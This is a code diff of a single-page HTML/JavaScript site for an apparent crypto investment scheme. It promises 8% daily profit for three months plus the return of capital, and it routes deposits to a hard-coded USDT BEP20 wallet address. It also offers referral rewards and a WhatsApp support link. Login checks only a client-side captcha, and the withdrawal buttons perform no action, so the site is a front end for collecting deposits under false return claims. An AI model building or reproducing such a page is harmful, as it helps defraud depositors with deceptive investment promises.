@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Original System Restored</title>
+<title>Restored Full System</title>
 
 <style>
 body{
@@ -21,6 +21,8 @@ padding:20px;
 border-radius:12px;
 }
 
+.hidden{display:none}
+
 input,button{
 width:100%;
 padding:10px;
@@ -29,11 +31,11 @@ border:none;
 border-radius:8px;
 }
 
-.hidden{display:none}
-
 .green{background:#22c55e;color:#000}
 .red{background:#ef4444;color:#fff}
 .blue{background:#3b82f6;color:#fff}
+.purple{background:#a855f7;color:#fff}
+.yellow{background:#facc15;color:#000}
 
 .balance{
 background:#22c55e;
@@ -50,9 +52,7 @@ display:flex;
 gap:10px;
 }
 
-.row button{
-width:50%;
-}
+.row button{width:50%;}
 
 .plan{
 background:#facc15;
@@ -69,23 +69,6 @@ background:#ef4444;
 color:#fff;
 }
 
-.depBtn{
-background:#facc15;
-color:#000;
-}
-.depBtn.active{
-background:#3b82f6;
-color:#fff;
-}
-
-.wBtn{
-background:#3b82f6;
-color:#fff;
-}
-.wBtn.active{
-background:#6b7280;
-}
-
 .capBox{
 background:#111;
 padding:8px;
@@ -94,35 +77,67 @@ border-radius:6px;
 font-weight:bold;
 letter-spacing:3px;
 }
+
+#loader{
+position:fixed;
+top:0;left:0;
+width:100%;height:100%;
+background:rgba(0,0,0,0.7);
+display:none;
+align-items:center;
+justify-content:center;
+z-index:9999;
+font-size:20px;
+}
+
+.supportBtn{
+background:#a855f7;
+color:#fff;
+}
+
+/* WITHDRAW BUTTONS */
+.wBtn{
+background:#3b82f6;
+color:#fff;
+margin-top:6px;
+}
 </style>
 </head>
 
 <body>
 
+<div id="loader">Loading...</div>
+
 <!-- LOGIN -->
 <div class="container" id="login">
 <h2>Login</h2>
+
 <input placeholder="Email / Phone">
 <input type="password" placeholder="Password">
+
 <div class="capBox" id="capLogin"></div>
-<input placeholder="Enter Captcha">
+<input id="loginCapInput" placeholder="Enter Captcha">
+
 <button class="green" onclick="login()">Login</button>
-<p style="text-align:center;color:#60a5fa;cursor:pointer" onclick="showSignup()">Create Account</p>
+<p onclick="showSignup()" style="color:#60a5fa;text-align:center;cursor:pointer">Create Account</p>
 </div>
 
 <!-- SIGNUP -->
 <div class="container hidden" id="signup">
 <h2>Create Account</h2>
+
 <input placeholder="Username">
 <input placeholder="Email">
 <input placeholder="Phone">
 <input type="password" placeholder="Password">
 <input type="password" placeholder="Confirm Password">
 <input placeholder="Invite Code">
+
 <div class="capBox" id="capSignup"></div>
-<input placeholder="Enter Captcha">
-<button class="green" onclick="login()">Create Account</button>
-<p style="text-align:center;color:#60a5fa;cursor:pointer" onclick="showLogin()">Back to Login</p>
+<input id="signupCapInput" placeholder="Enter Captcha">
+
+<button class="green" onclick="signup()">Create Account</button>
+<p onclick="showLogin()" style="color:#60a5fa;text-align:center;cursor:pointer">Back to Login</p>
 </div>
 
 <!-- HOME -->
@@ -135,8 +150,9 @@ letter-spacing:3px;
 <button class="red" onclick="show('deposit')">Deposit</button>
 </div>
 
-<!-- INVITE BUTTON -->
 <button class="blue" onclick="show('invite')">Invite & Earn</button>
+
+<button class="supportBtn" onclick="openSupport()">Support Team</button>
 
 <h3>Plans</h3>
 
@@ -163,30 +179,19 @@ letter-spacing:3px;
 
 </div>
 
-<!-- INVITE PAGE -->
-<div class="container hidden" id="invite">
-<h2>Invite & Earn</h2>
-
-<p>Your Referral Link:</p>
-
-<div style="background:#111;padding:10px;border-radius:8px;" id="refLink">
-https://rana785o.github.io/Earn-With-Website-786/
-</div>
-
-<button class="blue" onclick="copyRef()">Copy Link</button>
-
-<p style="margin-top:10px;">
-Share this link with your friends and earn rewards!
-</p>
-
-<button class="back" onclick="show('home')">Back</button>
-</div>
-
-<!-- PLAN -->
+<!-- PLAN PAGE (FIXED DETAILS) -->
 <div class="container hidden" id="plan">
 <h2 id="pTitle"></h2>
 <div id="pData"></div>
-<button class="blue">Activate Package</button>
+
+<button class="green">Activate Package</button>
+
+<hr>
+<p><b>Step:1 👇</b><br><u>Daily profit is 8%.</u></p>
+<p><b>Step:2 👇</b><br><u>For 3 months, you will receive a daily profit at the rate of 8%.</u></p>
+<p><b>Step:3 👇</b><br><u>After 3 months, your initial investment capital will be returned to you.</u></p>
+<hr>
+
 <button class="back" onclick="show('home')">Back</button>
 </div>
 
@@ -195,82 +200,107 @@ Share this link with your friends and earn rewards!
 
 <div class="balance">Balance: $0</div>
 
+<hr>
 <input id="amt" placeholder="Amount">
+<hr>
 
-<button class="depBtn" onclick="setAmt(this,50)">$50</button>
-<button class="depBtn" onclick="setAmt(this,100)">$100</button>
-<button class="depBtn" onclick="setAmt(this,200)">$200</button>
-<button class="depBtn" onclick="setAmt(this,300)">$300</button>
-<button class="depBtn" onclick="setAmt(this,400)">$400</button>
-<button class="depBtn" onclick="setAmt(this,500)">$500</button>
-<button class="depBtn" onclick="setAmt(this,600)">$600</button>
-<button class="depBtn" onclick="setAmt(this,700)">$700</button>
-<button class="depBtn" onclick="setAmt(this,800)">$800</button>
-<button class="depBtn" onclick="setAmt(this,900)">$900</button>
-<button class="depBtn" onclick="setAmt(this,1000)">$1,000</button>
-<button class="depBtn" onclick="setAmt(this,1500)">$1,500</button>
-<button class="depBtn" onclick="setAmt(this,2000)">$2,000</button>
-<button class="depBtn" onclick="setAmt(this,2500)">$2,500</button>
-<button class="depBtn" onclick="setAmt(this,3000)">$3,000</button>
-<button class="depBtn" onclick="setAmt(this,3500)">$3,500</button>
-<button class="depBtn" onclick="setAmt(this,4000)">$4,000</button>
-<button class="depBtn" onclick="setAmt(this,4500)">$4,500</button>
-<button class="depBtn" onclick="setAmt(this,5000)">$5,000</button>
-<button class="depBtn" onclick="setAmt(this,10000)">$10,000</button>
+<button class="yellow" onclick="setAmt(50)">$50</button>
+<button class="yellow" onclick="setAmt(100)">$100</button>
+<button class="yellow" onclick="setAmt(200)">$200</button>
+<button class="yellow" onclick="setAmt(300)">$300</button>
+<button class="yellow" onclick="setAmt(400)">$400</button>
+<button class="yellow" onclick="setAmt(500)">$500</button>
+<button class="yellow" onclick="setAmt(600)">$600</button>
+<button class="yellow" onclick="setAmt(700)">$700</button>
+<button class="yellow" onclick="setAmt(800)">$800</button>
+<button class="yellow" onclick="setAmt(900)">$900</button>
+<button class="yellow" onclick="setAmt(1000)">$1,000</button>
+<button class="yellow" onclick="setAmt(1500)">$1,500</button>
+<button class="yellow" onclick="setAmt(2000)">$2,000</button>
+<button class="yellow" onclick="setAmt(2500)">$2,500</button>
+<button class="yellow" onclick="setAmt(3000)">$3,000</button>
+<button class="yellow" onclick="setAmt(3500)">$3,500</button>
+<button class="yellow" onclick="setAmt(4000)">$4,000</button>
+<button class="yellow" onclick="setAmt(4500)">$4,500</button>
+<button class="yellow" onclick="setAmt(5000)">$5,000</button>
+<button class="yellow" onclick="setAmt(10000)">$10,000</button>
 
+<hr>
+<p><b>Step:1 👇</b><br><u>You can make a minimum deposit of $50 and a maximum deposit of $12,000 at one time.</u></p>
+<p><b>Step:2 👇</b><br><u>Your deposit will be received in your account within 30 minutes to 24 hours.</u></p>
+<hr>
 
-
-<div id="usdtBtn" class="blue hidden">
-<button onclick="button()">USDT BEP20 ✔</button>
+<div id="usdtBtn" class="hidden">
+<button class="blue"()">USDT BEP20</button>
 </div>
 
-<button id="this" class="green overflow-" onclick="openUSDT()">Confirm Deposit</button>
-
+<button class="green" onclick="openUSDT()">Confirm Deposit</button>
 <button class="back" onclick="show('home')">Back</button>
 
 </div>
 
 <!-- USDT -->
 <div class="container hidden" id="usdt">
-<h1>USDT (BEP20) Address</h1>
+<h2>USDT (BEP-20) Address  👇</h2>
+
 <div style="background:#111;padding:10px;border-radius:8px;">
-<b><i>0x951067dd4f164a3b72c93bc7f1a6dc980dd52a08</i></b>
+<u><i><b>0x951067dd4f164a3b72c93bc7f1a6dc980dd52a08</b></i></u>
 </div>
-<button onclick="copy()">Copy</button>
-<input placeholder="Transaction ID">
-<input type="file">
-<button class="green" onclick="submit()">Submit</button>
+
+<button onclick="copyUSDT()" class="blue">Copy</button>
+<h1><input placeholder="Transaction ID"></h1>
+<h1><input type="file"></h1>
+<button class="green">Submit</button>
 <button class="back" onclick="show('deposit')">Back</button>
 </div>
 
-<!-- WITHDRAW -->
+<!-- WITHDRAW (FIXED BUTTONS RESTORED) -->
 <div class="container hidden" id="withdraw">
+
 <div class="balance">Balance: $0</div>
+
+<hr>
 <input placeholder="Amount">
-<button onclick="showW('bep')">BEP20</button>
+<hr>
+
+<button class="wBtn" onclick="showW('bep')">BEP20</button>
 <div id="bep" class="hidden"><input placeholder="BEP20 Address"></div>
-<button onclick="showW('erc')">ERC20</button>
+
+<button class="wBtn" onclick="showW('erc')">ERC20</button>
 <div id="erc" class="hidden"><input placeholder="ERC20 Address"></div>
-<button onclick="showW('trc')">TRC20</button>
+
+<button class="wBtn" onclick="showW('trc')">TRC20</button>
 <div id="trc" class="hidden"><input placeholder="TRC20 Address"></div>
+
+<hr>
+<p><b>Step:1 👇</b><br><u>You can make a withdrawal of a minimum of $10 and a maximum of $1,200 at one time.</u></p>
+<p><b>Step:2 👇</b><br><u>You will receive your withdrawal within 30 minutes to 24 hours.</u></p>
+<p><b>Step:3 👇</b><br><u>You can make up to 5 withdrawals in one day.</u></p>
+<hr>
+
 <button class="green">Confirm Withdraw</button>
-<button class="red" onclick="show('home')">Back</button>
+<button class="back" onclick="show('home')">Back</button>
+
+</div>
+
+<!-- INVITE -->
+<div class="container hidden" id="invite">
+<h2>Invite & Earn</h2>
+
+<div id="refLink" style="background:#111;padding:10px;border-radius:8px;">
+https://rana785o.github.io/Earn-With-Website-786/
+</div>
+
+<p><b>Step:👇</b><br><u>Copy this link and share it with your friends.</u></p>
+
+<button class="green" onclick="copyRef()">Copy Link</button>
+
+<button class="back" onclick="show('home')">Back</button>
 </div>
 
 <script>
 
-/* NAV */
-function show(id){
-document.querySelectorAll('.container').forEach(e=>e.classList.add('hidden'));
-document.getElementById(id).classList.remove('hidden');
-}
-
-/* LOGIN */
-function login(){ show('home'); }
-
-/* SIGNUP */
-function showSignup(){ show('signup'); }
-function showLogin(){ show('login'); }
+let capLogin="", capSignup="";
 
 /* CAPTCHA */
 function rand(){
@@ -278,40 +308,56 @@ return Math.random().toString(36).substring(2,6).toUpperCase();
 }
 
 function refreshCap(){
-document.getElementById("capLogin").innerText=rand();
-document.getElementById("capSignup").innerText=rand();
+capLogin=rand();
+capSignup=rand();
+document.getElementById("capLogin").innerText=capLogin;
+document.getElementById("capSignup").innerText=capSignup;
+}
+refreshCap();
+
+/* LOADER */
+function loading(cb){
+document.getElementById("loader").style.display="flex";
+setTimeout(()=>{document.getElementById("loader").style.display="none";cb();},500);
 }
 
-refreshCap();
-setInterval(refreshCap,30000);
+/* NAV */
+function show(id){
+loading(()=>{
+document.querySelectorAll(".container").forEach(e=>e.classList.add("hidden"));
+document.getElementById(id).classList.remove("hidden");
+});
+}
 
-/* PLAN */
+/* LOGIN */
+function login(){
+let v=document.getElementById("loginCapInput").value;
+if(v!==capLogin){alert("Wrong CAPTCHA");refreshCap();return;}
+show('home');
+}
+
+/* SIGNUP */
+function signup(){
+let v=document.getElementById("signupCapInput").value;
+if(v!==capSignup){alert("Wrong CAPTCHA");refreshCap();return;}
+show('home');
+}
+
+/* PLAN FIXED DETAILS */
 function openPlan(v){
 show('plan');
+
 let d=(v*0.08).toFixed(2);
 let m=(d*30).toFixed(2);
 let t=(d*90).toFixed(2);
+
 document.getElementById("pTitle").innerText="$"+v+" Plan";
 document.getElementById("pData").innerHTML=`
-<p>Daily Profit 8%: (8% = $${d})</p>
+<p>Daily Profit: $${d}</p>
 <p>Monthly Profit: $${m}</p>
-<p>3 Months Profit: $${t}</p>`;
+<p>3 Months Profit: $${t}</p>
+`;
 }
-
-/* DEPOSIT */
-function setAmt(btn,v){
-document.getElementById("amt").value=v;
-document.getElementById("usdtBtn").classList.remove("hidden");
-}
-
-function openUSDT(){ show('usdt'); }
-
-function copy(){
-navigator.clipboard.writeText("0x951067dd4f164a3b72c93bc7f1a6dc980dd52a08");
-alert("Copied");
-}
-
-function submit(){ alert("Submitted"); }
 
 /* WITHDRAW */
 function showW(id){
@@ -321,11 +367,31 @@ document.getElementById(i).classList.add("hidden");
 document.getElementById(id).classList.remove("hidden");
 }
 
+/* DEPOSIT */
+function setAmt(v){
+document.getElementById("amt").value=v;
+document.getElementById("usdtBtn").classList.remove("hidden");
+}
+
+/* USDT */
+function openUSDT(){ show('usdt'); }
+
+function copyUSDT(){
+navigator.clipboard.writeText("0x951067dd4f164a3b72c93bc7f1a6dc980dd52a08");
+alert("Copied");
+}
+
+/* SUPPORT */
+function openSupport(){
+loading(()=>{
+window.location.href="https://wa.me/923390139727";
+});
+}
+
 /* INVITE */
 function copyRef(){
-let text = document.getElementById("refLink").innerText;
-navigator.clipboard.writeText(text);
-alert("Referral Link Copied");
+navigator.clipboard.writeText(document.getElementById("refLink").innerText);
+alert("Copied");
 }
 
 </script>
